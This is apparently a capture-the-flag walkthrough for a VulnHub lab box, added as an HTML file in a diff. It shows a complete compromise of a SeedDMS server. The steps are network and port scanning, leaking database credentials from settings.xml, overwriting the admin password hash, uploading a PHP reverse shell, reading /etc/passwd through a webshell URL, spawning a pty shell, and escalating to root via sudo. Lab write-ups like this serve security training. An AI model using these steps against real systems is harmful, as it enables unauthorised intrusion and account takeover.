@@ -1,0 +1,144 @@
+<p>Target Identification</p>
+<p>Identify the IP addr of the target machine MAC address: 08:00:27:9c:8d:48</p>
+<p>$sudo netdiscover -r 172.20.10.0/24</p>
+<p><img src='./Assets/Screenshot_1.png' alt='descriptive_pic'/></p>
+<p>172.20.10.2</p>
+<p>Port Scan</p>
+<p>• Scan for open ports • To get information about open services</p>
+<p>$nmap -sV -p- 172.20.10.2</p>
+<p><img src='./Assets/Screenshot_2.png' alt='descriptive_pic'/></p>
+<p>Open ports • 80 http • 3306 mysql • 33060 mysqlx</p>
+<p>• The SSH port is not open • We have to find a way to do remote command execution on the target<br />
+• We can’t bruteforce<br />
+• We may have to read the codes on the webserver</p>
+<p>Inspect the website</p>
+<p>Visit the URL: http://172.20.10.2/</p>
+<p>There is no much information on the homepage</p>
+<p><img src='./Assets/Screenshot_3.png' alt='descriptive_pic'/></p>
+<p>• Right click on the webpage • select inspect element • select network tab • click on reload • Scroll up, you locate a main.js file. Click on it.</p>
+<p><img src='./Assets/Screenshot_4.png' alt='descriptive_pic'/></p>
+<ul>
+<li>At the right hand side of the page, click on Response</li>
+<li>Scroll down, you will see a comment talking about js file (seeddms51x)</li>
+<li>//make sure this js file is same as installed app on our server endpoint: /seeddms51x/seeddms-5.1.22/</li>
+</ul>
+<p><img src='./Assets/Screenshot_5.png' alt='descriptive_pic'/></p>
+<p>There is a Document Management System link (/seeddms51x/seeddms-5.1.22/)</p>
+<p>Enumerate the directories</p>
+<p>To find hidden files</p>
+<p>┌──(kali㉿kali)-[~/Downloads/vulnhub/hackmeplease] └─$ gobuster dir -u http://172.20.10.2/seeddms51x/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</p>
+<p><img src='./Assets/Screenshot_6.png' alt='descriptive_pic'/></p>
+<p>There are four hidden files</p>
+<p>Lets look at git repo for any exploit for the DMS</p>
+<p>https://sourceforge.net/p/seeddms/code/ci/5.1.22/tree/</p>
+<p>https://www.exploit-db.com/exploits/47022</p>
+<p>There are lots of directories in the repo conf which is the configuration of the web app</p>
+<p><img src='./Assets/Screenshot_7.png' alt='descriptive_pic'/></p>
+<p>http://172.20.10.2/seeddms51x/conf</p>
+<p><img src='./Assets/Screenshot_8.png' alt='descriptive_pic'/></p>
+<p>• we got forbidden feedback for the directory • that means there is a .htaccess file that restrict directory browsing</p>
+<p><img src='./Assets/Screenshot_9.png' alt='descriptive_pic'/></p>
+<ul>
+<li>.htaccess can be seen from the repository settings.xml template might be a flag</li>
+<li>we can assume there might be a misconfiguration in .htaccess file which can give us access to the database credentials. Adding the settings.xml to the directory</li>
+</ul>
+<p>http://172.20.10.2/seeddms51x/conf/settings.xml</p>
+<p><img src='./Assets/Screenshot_10.png' alt='descriptive_pic'/></p>
+<ul>
+<li>we got the database server’s username and password</li>
+<li>Login to the server</li>
+</ul>
+<p>$mysql -h 172.20.10.2 -u seeddms -p seeddms -D seeddms</p>
+<p><img src='./Assets/Screenshot_11.png' alt='descriptive_pic'/></p>
+<p>We are to see the list of tables.</p>
+<p>Command: show tables;</p>
+<p><img src='./Assets/Screenshot_12.png' alt='descriptive_pic'/></p>
+<ul>
+<li>There are different tables but there is one that is users</li>
+<li>This will have the list of users in the database.</li>
+<li>Lets see its content</li>
+</ul>
+<p>command: select * from users;</p>
+<p><img src='./Assets/Screenshot_13.png' alt='descriptive_pic'/></p>
+<ul>
+<li>we got the password of a user but we don’t his username</li>
+<li>we can update the password of the admin then login into the web app.</li>
+</ul>
+<p>command: SELECT login, pwd FROM tblUsers;</p>
+<p><img src='./Assets/Screenshot_14.png' alt='descriptive_pic'/></p>
+<ul>
+<li><p>we have the md5 hash of admin password</p></li>
+<li><p>Lets change the password to admin and generate its MD5 hash.</p>
+<p><img src='./Assets/Screenshot_15.png' alt='descriptive_pic'/></p></li>
+</ul>
+<p>Update the new password hash</p>
+<p>command: UPDATE tblUsers * → SET pwd= ‘21232f297a57a5a743894a0e4a801fc3’ * → WHERE login= ‘admin’ ;</p>
+<p><img src='./Assets/Screenshot_16.png' alt='descriptive_pic'/></p>
+<p>Then go to the login page</p>
+<p><img src='./Assets/Screenshot_17.png' alt='descriptive_pic'/></p>
+<p>Then login using admin as username and password</p>
+<p><img src='./Assets/Screenshot_18.png' alt='descriptive_pic'/></p>
+<ul>
+<li>It seems this web page is to manage documents online.</li>
+<li>There is a tab to upload file,s.</li>
+<li>Lets create a web shell and upload it to gain remote command execution.</li>
+</ul>
+<p><img src='./Assets/Screenshot_19.png' alt='descriptive_pic'/></p>
+<ul>
+<li>Use locate command to locate the reverse shell php</li>
+<li>Scroll down till you locate “/usr/share/laudanum/php/php-reverse-shell.php”</li>
+</ul>
+<p><img src='./Assets/Screenshot_20.png' alt='descriptive_pic'/></p>
+<p>shell.php was created</p>
+<p><img src='./Assets/Screenshot_21.png' alt='descriptive_pic'/></p>
+<ul>
+<li>Edit the shell using nano command</li>
+<li>Use down arrow key to scroll down to the line of the IP and Port</li>
+<li>Change the IP addr to IP addr of the (Attacking machine) and the port number to any number as listening port</li>
+<li>Use Ctrl O to save and Ctrl X to exit</li>
+</ul>
+<p><img src='./Assets/Screenshot_22.png' alt='descriptive_pic'/></p>
+<p>Upload it</p>
+<p><img src='./Assets/Screenshot_23.png' alt='descriptive_pic'/></p>
+<p><img src='./Assets/Screenshot_24.png' alt='descriptive_pic'/></p>
+<ul>
+<li>The Web shell (shell.php) has been uploaded.</li>
+<li>Click on the uploaded shell to see its information The file ID is 7 in my case.</li>
+</ul>
+<p><img src='./Assets/Screenshot_25.png' alt='descriptive_pic'/></p>
+<p>Lets start listening from the target machine using the port</p>
+<p><img src='./Assets/Screenshot_26.png' alt='descriptive_pic'/></p>
+<p>https://www.exploit-db.com/exploits/47022 1. : Now after uploading the file check the document id corresponding to the document. 1. : Now go to example.com/data/1048576/“document_id”/1.php?cmd=cat+/etc/passwd to get the command response in browser.</p>
+<p>Note: Here “data” and “1048576” are default folders where the uploaded files are getting saved.</p>
+<ul>
+<li>Default: example.com/data/1048576/“document_id”/1.php</li>
+<li>Change the document ID to 7. http://172.20.10.2/seeddms51x/data/1048576/7/1.php</li>
+</ul>
+<p><img src='./Assets/Screenshot_27.png' alt='descriptive_pic'/></p>
+<p>We are listening at port 465</p>
+<p><img src='./Assets/Screenshot_28.png' alt='descriptive_pic'/></p>
+<ul>
+<li>We have the reverse shell.</li>
+<li>Go to the etc/passwd file.</li>
+<li>we found the username as saket.</li>
+</ul>
+<p>command: grep bash etc/passwd</p>
+<p><img src='./Assets/Screenshot_29.png' alt='descriptive_pic'/></p>
+<p>Let’s upgrade the shell to bash shell using python script.</p>
+<p>command: python3 -c ‘import pty;pty.spawn(“/bin/bash”)’</p>
+<p><img src='./Assets/Screenshot_30.png' alt='descriptive_pic'/></p>
+<ul>
+<li>Now we have the bash shell.</li>
+<li>Lets change the directory to saket.</li>
+<li>we already have his password (Saket@#$1337).</li>
+</ul>
+<p>$ su -l saket</p>
+<p><img src='./Assets/Screenshot_31.png' alt='descriptive_pic'/></p>
+<p>Check the sudo permission of the user</p>
+<p><img src='./Assets/Screenshot_32.png' alt='descriptive_pic'/></p>
+<ul>
+<li>The user saket has access to everything.</li>
+<li>Lets get to the root.</li>
+</ul>
+<p><img src='./Assets/Screenshot_33.png' alt='descriptive_pic'/></p>
+<p>We got the root shell</p>
